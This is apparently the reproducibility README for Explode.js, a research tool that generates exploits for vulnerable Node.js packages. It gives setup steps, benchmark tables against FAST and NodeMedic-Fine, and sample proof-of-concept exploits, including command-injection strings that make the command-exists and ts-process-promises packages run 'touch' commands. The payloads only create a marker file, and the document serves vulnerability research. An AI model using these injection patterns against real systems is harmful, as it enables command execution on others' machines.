# Automated Exploit Generation for Node.js Packages

This artifact evaluates Explode.js, a novel tool for synthesizing exploits for Node.js applications.
By combining static analysis and symbolic execution, Explode.js generates functional exploits
that confirm the existence of command injection (CWE-78), code injection (CWE-94), prototype pollution (CWE-1321), and path traversal (CWE-22) vulnerabilities.
This repository includes the complete source code, reference datasets and detailed instructions for building and running the experiments that evaluate our tool.
These experiments generate the results shown in the paper's tables.
This artifact allows you to reproduce those results, and their validity can be
confimed by comparing your findings with the paper's reported results.

# A. Getting Started

This section includes an introduction to the Explode.js tool, along with its requirements, setup instructions, and basic testing procedures for running the artifact.

## A.1. Description & Requirements

**How to Access.**
The artifact is available as a persistent DOI at [10.5281/zenodo.15009157](10.5281/zenodo.15009157).

**Dependencies.**
The evaluation of this artifact does not depend on specific hardware. However, the following software and hardware specifications are recommended:

- Linux (tested with Ubuntu Ubuntu 24.04.2 LTS and Debian 10/11);
- Docker (tested with version 28.0.1);
- 32GiB RAM;
- Stable internet connection (Explode-js requires npm install to validate exploits).

**Source Code and Benchmarks.**
All source code and reference benchmarks are included in the repository and respective docker images.

**Time.**
We estimate that the time needed to run the artifact evaluation is as follows:
- Getting started: 30 minutes (approximately).
- Main experiments: 34-48 hours (approximately).

**Artifact Structure.**
The artifact is organized as follows:

```
Explode.js
├── bench
│   ├── datasets                # Benchmarks to be evaluated
│   │   ├── secbench-dataset
│   │   ├── vulcan-dataset
│   │   ├── zeroday
│   │   └── fast-pocs           # Manual PoC created for FAST
│   ├── fast                    # Submodule with the FAST tool repository
│   ├── NodeMedic               # Submodule with the NodeMedic-Fine tool repository
│   └── plots                   # Scripts to run experiments and setup
├── example                     # Example programs for Explode.js
│   └── running-example         # Running example code
├── run_explode-js.sh           # Script to replicate Explode.js's results
├── run_explode-js_cwe{22|78|94|1321}.sh  # Run single categories
├── run_explode-js_no-vis.sh    # Run no VIS ablation study
├── run_explode-js_no-lazy-values.sh # Run no lazy values ablation study
├── run_explode-js_zeroday.sh   # Script to run in the wild evaluation
├── run_fast.py                 # Script to replicate FAST's results
├── run_nodeMedic.py            # Script to replicate NodeMedic's results
├── explode-js_image.tar.gz     # Explode.js's Docker image
├── fast_image.tar.gz           # FAST's Docker image
├── nodemedic_image.tar.gz      # NodeMedic's Docker image
│ ...
├── Dockerfile
└── README.md                   # This README.md
```

The artifact includes three Docker containers: `explode-js_image.tar.gz`, `fast_image.tar.gz`, and `nodemedic_image.tar.gz`. The first container corresponds to Explode.js, our tool, while the second and third correspond to FAST and NodeMedic-Fine, the main competing tools. Each tool's experiments should be executed with its designated Docker container.

## A.2. Getting Started with Explode.js

**Setup.**
To set up the environment, load the Explode.js Docker image, `explode-js_image.tar.gz`, using the following command in the root directory of the artifact:

```sh
$ docker load < explode-js_image.tar.gz
```

**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, execute Explode.js on the running example using the following commands:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js/example
$ explode-js full running-example/index.js
```

**Output.** Running the command above generate an exploit for the vulnerability in the source code of the running example. The output of the previous command should be:

```
[STEP 1] MDG: Generating...

[STEP 1] MDG: Completed.
[STEP 2] Queries: Importing the graph...
[INFO] Stop running Neo4j local instance.
[INFO] Import MDG to Neo4j.
[INFO] Starting Neo4j
[STEP 2] Queries: Imported
[STEP 3] Queries: Traversing Graph...
[INFO] Running injection query.
[INFO] Reconstructing attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Assigning types to attacker-controlled data.
[INFO] Running prototype pollution query.
[INFO] Prototype Pollution - Reconstructing attacker-controlled data.
[INFO] Detected 1 vulnerabilities.
[STEP 3] Queries: Completed.
── PHASE 1: TEMPLATE GENERATION ──
✔ Loaded: _results/taint_summary.json
⚒ Generating 1 template(s):
├── 📄 ./symbolic_test_0.js

── PHASE 2: ANALYSIS & VALIDATION ──
◉ [1/1] Procesing ./symbolic_test_0.js
├── Symbolic execution output:
"Uncaught TypeError"
"Uncaught TypeError"
"File too big"
Exec failure: (str.++
               ((str.++
                 ((str.++
                   ((str.++ ((str.++ ("rsync -av /tmp/0 ", id)), "@")),
                   host)), ":")), dstDir))
├── Symbolic execution stats: clock: 30.812713s | solver: 30.421486s
├── ⚠ Detected 1 issue(s)!
│   ├── ↺ Replaying 2 test case(s)
│   │   ├── 📄 [1/2] Using test case: ./symbolic_test_0/test-suite/witness-0.json
│   │   │   ├── Node exited with 0
│   │   │   └── ✔ Status: Success (created file "./success")
```

The generated exploit can be found in the file `_results/run/symbolic_test_0/literal_1.js`.

## A.3. Getting Started with FAST

**Setup.**
To setup the environment, load the FAST Docker image, `fast_image.tar.gz`, using the following command in the root directory of the artifact:

```sh
$ docker load < fast_image.tar.gz
```
**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, run FAST's running example (the package `command-exists@1.2.2`) using the following commands:

```sh
$ docker run --rm -it fast:latest bash
$ cd explode-js
$ python3 run-fast.py datasets out --packages command-exists
```

**Output.** The output of the previous command should be:

```
[*] 2 package(s) selected for benchmarking
[-] Running: command-exists@1.2.2
Running: python3 -m simurun -t os_command -X datasets/vulcan-dataset/CWE-78/659/src/command-exists.js
[-] Running: command-exists@1.2.2
Running: python3 -m simurun -t os_command -X datasets/secbench-dataset/CWE-78/command-exists_1.2.2/src/command-exists.js

| package        | version   | cwe    | marker   |   path_time |   expl_time |   total_time | detection   | exploit    |
|:---------------|:----------|:-------|:---------|------------:|------------:|-------------:|:------------|:-----------|
| command-exists | 1.2.2     | CWE-78 | Exited 0 |    0.94026  |     13.822  |      14.7623 | successful  | successful |
| command-exists | 1.2.2     | CWE-78 | Exited 0 |    0.838758 |     17.1162 |      17.955  | successful  | successful |
```

The output table is saved in `.csv` format as `fast-parsed-results.csv`.

**Remark:**

Importantly, FAST does not generate executable exploits. Instead, it produces a
log containing information about the vulnerable package function and the
inputs required to trigger the exploit.
Below, we provide the relevant fragment of FAST's log for the current example,
which can be found in the file `cat out/134_fast/fast-stdout.log`:

```
...
[AUTO] Constraint solver is solving for module.exports().then()...
Constraints #1:
[Contains(s5014, "''; touch exploited #"),
 s5009 == "where ",
 s5014 == Concat(s5009, s3021),
 Not(PrefixOf(";", s5014)),
 Not(PrefixOf("&", s5014))]
Results #1:
INPUT commandName(s3021) = "''; touch exploited #"
SINK sink, command(s5014) = "where ''; touch exploited #"
[AUTO] Successfully found solution!
...
```

Based on the provided log, one can manually construct the following exploit:

```js
var sink = require("command-exists");
var commandName = "''; touch success #";
var callback = function(){};
sink(commandName, callback);
```

## A.4. Getting Started with *NodeMedic-Fine*

**Setup.**
To setup the environment, install the necessary dependencies and load
the NodeMedic-Fine Docker image, `nodemedic_image.tar.gz`, with the following
command:

```sh
# Create venv to avoid polluting the system environment
$ python3 -m venv venv
$ souce venv/bin/activate
$ python3 -m pip install -r requirements.txt
$ docker load < nodemedic_image.tar.gz
```

**Basic Testing.**
To ensure that the image is loaded correctly and that the tool is functioning as expected, execute NodeMedic's running example (the package `ts-process-promises@1.0.2`) using the following command:

```sh
$ python3 run-NodeMedic.py bench/datasets out --packages ts-process-promises
```

**Output.** The output of the previous command should be:

```
[*] 1 package(s) selected for benchmarking
[-] Running: ts-process-promises@1.0.2
Running: docker run -it --rm -v /Users/framos/Desktop/explode-js/out/ts-process-promises@1.0.2__nodeMedic:/nodetaint/analysisArtifacts:rw nodemedic-fine:latest --package=ts-process-promises --version=1.0.2 --mode=full

| package             | version   | cwe    | marker   |   fuzz_time |   expl_time |   total_time | taintpath   | exploit   |
|:--------------------|:----------|:-------|:---------|------------:|------------:|-------------:|:------------|:----------|
| ts-process-promises | 1.0.2     | CWE-78 | Exited 0 |      20.097 |      10.628 |      72.4447 | true        | true      |
```

One of the generated exploits can be found in the file `out/ts-process-promises@1.0.2__nodeMedic/poc0.js`:

```js
// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};

var PUT = require('/nodetaint/packageData/ts-process-promises/node_modules/ts-process-promises');
try {
	var x0 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
var x1 = {};
new PUT["exec"](x0,x1)();
} catch (e) {
	console.log(e);
}
```

# B. Main Experiments

With this artifact, our goal is to demonstrate the following claims of the paper, each corresponding to one of its main research questions:

- **Claim 1** *(RQ1 - Section 6.1): Effectiveness in Exploit Generation.*
Explode.js is more effective in generating exploits than its main competing tools (FAST[] and NodeMedic-Fine[]).

- **Claim 2** *(RQ2 - Section 6.2): Exploit Generation in the Wild.*
Explode.js is able to find new exploits for real-wold Node.js modules in the wild.

- **Claim 3** *(RQ3 - Section 6.3): Performance Evaluation.*
Explode.js is able to generate exploits in feasible time, but is less performant than its main competitor tools.

- **Claim 4** *(RQ4 - Section 6.4): Necessity of Explode.js Components.*
The core techniques of Explode.js (VISes and lazy values) are key to its effectiveness.

This section provides instructions for reproducing the experiments that support the claims of the paper.

**Timeouts.** For all experiments, the analysis of each package has a predefined timeout of 10 minutes.
This parameter can affect the results produced, as different machines may experience varying numbers of timeouts.
Consequently, there may be slight variations in the results, but all claims are expected to be verified.

**Updated Results**: The results presented here do not precisely
coincide with those in the paper's original submitted version because we
continued to refine our tool to improve the effectiveness of the exploit generation mechanisms for path traversal
(CWE-22) and code injection (CWE-94) vulnerabilities. As a result, in the
Vulcan and SecBench.js datasets, the total number of vulnerabilities detected
by Explode.js increased from 293 to 340, and the number of exploits generated
went from 172 to 263. However, these changes led to slight decreases in some categories:

- The number of exploits generated for CWE-72 vulnerabilities decreased from 75 to 70;
- The number of identified vulnerabilities (true positives) dropped in all categories except CWE-22.

Note that the main claim of the paper regarding the evaluation in these datasets
remains unchanged: Explode.js outperforms the two competing tools overall and
in each vulnerability category, both in vulnerability detection and exploit generation.
The advantage of Explode.js over the competing tools is particularly significant in the aspect of exploit generation, which is the main goal of the paper.

We will update the results in the text, tables, and plots in the camera-ready
version of the paper to reflect the new status of the tool.

## B.1. Claims 1 and 3

The goal of this section is to confirm the updated results presented in Sections 6.1 and 6.3 of the paper;
specifically those of Tables 3 and 6, which we reproduce below.

To reproduce the results of these tables, one must first run Explode.js, FAST, and NodeMedic-Fine in the Vulcan and SecBench.js datasets.
In the following, we explain how to do this separately for each tool.

**Table 3. [Effectiveness]**

| CWE ID   |  Total |  TP (Explode-js) |   E (Explode-js) | TP (FAST) | E (FAST) | TP (NodeMedic) | E (NodeMedic) |
|----------|--------|-----|-----|----|----|----|----|
| CWE-22   |    166 |  97 |  84 | 6 | 0 | -- | -- |
| CWE-78   |    169 | 111 |  70 | 108 | 66 | 51 | 49 |
| CWE-94   |     54 |  24 |  11 | 7 | 3 | 17 | 5 |
| CWE-1321 |    214 | 108 |  98 | 0 | 0 | -- | -- |
| Total    |    603 | 340 | 263 | 119 | 69 | 68 | 44 |

Where:

- Total indicates the total number of packages to be analyzed;
- TP (Explode.js), TP (FAST), TP (NodeMedic) refer to the number of true vulnerabilities (true positives) detected by Explode.js, FAST, and NodeMedic, respectively, not necessarily with a working exploit;
- E (Explode.js), E (FAST), E (NodeMedic) refer to the number of exploits generated by Explode.js, FAST, and NodeMedic, respectively.

NodeMedic does not detect or generate exploits for CWE-22 and CWE-1321, which correspond to path traversal and prototype pollution vulnerabilities. Hence, the dashes in the tables indicate the absence of data for these cases.

**Table 6. [Performance]**

| CWE ID   | Total (Explode.js) | Total (FAST) | Total (NodeMedic-Fine) |
|----------|---------|----------|---------|
| CWE-22   | 31.568s | 4.271s | -- |
| CWE-78   | 40.521s | 20.405s | 39.311s |
| CWE-94   | 54.873s | 5.939s | 18.824s |
| CWE-1321 | 42.112s | 19.130s | -- |
| Total    | 39.728s | 13.674s | 19.730s |

Where we place in each cell the average time that the respective tool took to
analyze the vulnerabilities of the corresponding category.
For example, in the cell (CWE-22, Explode.js), we place the average time that
Explode.js took to analyze the packages with path traversal vulnerabilities (CWE-22).


### B.1.1. Explode.js

Run the following commands:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js.sh
```

This will take approximately **10 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

The generated exploits are stored in the output dirs in `bench/datasets/CWE-{22|78|94|1321}`.
To check the exploit generated for a specific package, say the `command-exists@1.2.2` package,
run the command:

```sh
$ python3 retriever.py command-exists
bench/datasets/CWE-78/134/run/./symbolic_test_0/literal_1.js
bench/datasets/CWE-78/600/run/./symbolic_test_0/literal_1.js
```

Which outputs the path to the file(s) storing the exploit(s).


To generate the Explode.js results of Table 3, run:

```sh
$ python3 table_explode-js.py
```

To generate the Explode.js results of Table 6, run:

```sh
$ python3 table_explode-js_time.py
```

### B.1.2. FAST

Run the following commands:

```sh
$ cd explode-js
$ python3 run-fast.py datasets/ out && python3 table_fast.py
```

This will take approximately **7 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

As stated before, FAST does not generate executable exploits; those have to be manually put together from the output log information.
We have done that for all the generated logs in the dataset, which can be consulted in the folder `bench/datasets/fast-pocs`.
To check the exploit generated for a specific package, say the `xopen@1.0.0` package, see file `bench/datasets/fast-pocs/xopen/poc.js`.

To generate the FAST results of Table 3, run:

```sh
$ python3 table_fast.py
```

To generate the FAST results of Table 6, run:

```sh
$ python3 table_fast_time.py
```

### B.1.3. NodeMedic-Fine

Run the following command in the root of the artifact:

```sh
$ python3 run-NodeMedic.py bench/datasets out && python3 table_nodemedic.py
```

This will take approximately **5 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

The generated exploits are stored in `out/`. To check the exploit generated for a
specific package, say the `command-exists@1.2.2` package, see file `out/command-exists@1.2.2__nodeMedic/poc0.js`.

To generate the NodeMedic-Fine results of Table 3, run:

```sh
$ python3 table_nodemedic.py
```

To generate the NodeMedic-Fine results of Table 6, run:

```sh
$ python3 table_nodemedic_time.py
```

### B.1.4. Speed-up the Analysis

For the sake of time, instead of confirming the results for the entire dataset,
the reviewers can verify the results for just one specific type of vulnerability.
To this end, it is sufficient to run the main analysis script for that specific
type of vulnerability. Below, we explain how to do this for each tool.

**Explode.js** For Explode.js instead of running the command:

```sh
$ ./run_explode-js.sh
```

Run the command specific to the targeted vulnerability type:

```sh
$ ./run_explode-js_cwe22.sh
$ ./run_explode-js_cwe78.sh
$ ./run_explode-js_cwe94.sh
$ ./run_explode-js_cwe1321.sh
```

**FAST**:

```sh
$ python3 run-fast.py datasets/ out --cwes CWE-22
$ python3 run-fast.py datasets/ out --cwes CWE-78
$ python3 run-fast.py datasets/ out --cwes CWE-94
$ python3 run-fast.py datasets/ out --cwes CWE-1321
```

**NodeMedic-Fine**:

```sh
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-78
$ python3 run-NodeMedic.py bench/datasets outputs --cwes CWE-94
```

## Claim 2

The goal of this section is to confirm the updated results presented in Section 6.2 of the paper;
specifically those of Table 5, which we reproduce below:

**Table 5. [Explode.js in the Wild]**

| CWE ID   | Paths | Exploits |
|----------|-------|----------|
| CWE-22   |    88 |       70 |
| CWE-78   |   151 |       51 |
| CWE-94   |    45 |        2 |
| CWE-1321 |     7 |        2 |
| Total    |   291 |      125 |

To reproduce the results of the table above, we provide the set of packages for which Explode.js found
new vulnerabilities in `bench/datasets/zeroday` and a script to run Explode.js on these packages.
To run Explode.js on the wild packages in which new vulnerabilities were found, run:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js_zeroday.sh
```

This will take approximately **1.5 hours**. The scripts prints to the stdout a version of the table above and the generated exploits can be found in the `bench/datasets/zeroday-output` dir.
To check the exploit generated for a specific package, say the `aaptjs` package, run:

```sh
$ python3 retriever.py apptjs
bench/datasets/zeroday-output/0/run/./symbolic_test_6/literal_1.js
bench/datasets/zeroday-output/0/run/./symbolic_test_5/literal_1.js
bench/datasets/zeroday-output/0/run/./symbolic_test_4/literal_1.js
bench/datasets/zeroday-output/0/run/./symbolic_test_3/literal_1.js
bench/datasets/zeroday-output/0/run/./symbolic_test_2/literal_1.js
bench/datasets/zeroday-output/0/run/./symbolic_test_1/literal_1.js
bench/datasets/zeroday-output/0/run/./symbolic_test_0/literal_1.js
```

To generate Table 5, run:

```sh
$ python3 table_explode-js_zeroday.py
```

A table summarizing the results should be printed to the stdout.

## Claim 4

The goal of this section is to confirm the updated results presented in Section 6.4 of the paper, specifically those in Table 7, which we reproduce in the tables below. To generate these tables, one must first run Explode.js without VISes or Lazy Values, as we explain below.

**Table 7. [Explode.js Components]**

**No VIS**

| CWE ID   | Total Vulns |  TP |   E |
|----------|-------------|-----|-----|
| CWE-22   |         166 |   0 |   0 |
| CWE-78   |         169 |  60 |  44 |
| CWE-94   |          54 |   8 |   1 |
| CWE-1321 |         214 |  18 |   5 |
| Total    |         603 |  86 |  50 |

**No lazy values**

| CWE ID   |  Total Vulns |  TP |   E |
|----------|--------------|-----|-----|
| CWE-22   |          166 |   3 |   1 |
| CWE-78   |          169 |  57 |  46 |
| CWE-94   |           54 |  17 |  10 |
| CWE-1321 |          214 |  41 |  33 |
| Total    |          603 | 118 |  90 |

Where:
- Total indicates the total number of packages to be analyzed;
- TP refers to the number of true vulnerabilities detected by Explode.js when  adapted with no VISes (first table) and no lazy values (second table) respectively, and
- E refers to the number of exploits generated by Explode.js when adapted with no VISes (first table) and no lazy values (second table) respectively.

### Claim 4.1: No VISes

To execute Explode.js with no VISes, run:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js_no-vis.sh
```

This will take approximately **2 hours**. The execution was successful if a
table summarizing the results is printed to stdout at the end.

After executing the scripts above, it is always possible to
obtain the table with the corresponding results by running
the command:

```sh
$ python3 table_explode-js2.py ./bench/datasets/no-vis/results.csv
```

### Claim 4.1: No Lazy Values

To execute Explode.js with no Lazy Values, run:

```sh
$ docker run --rm -it explode-js:latest bash
$ cd explode-js
$ ./run_explode-js_no-lazy-values.sh
```

This will take approximately **8 hours**.  The execution was successful if a
table summarizing the results is printed to stdout at the end.

After executing the scripts above, it is always possible to
obtain the table with the corresponding results by running
the command:

```sh
$ python3 table_explode-js2.py ./bench/datasets/no-lazy-values/results.csv
```
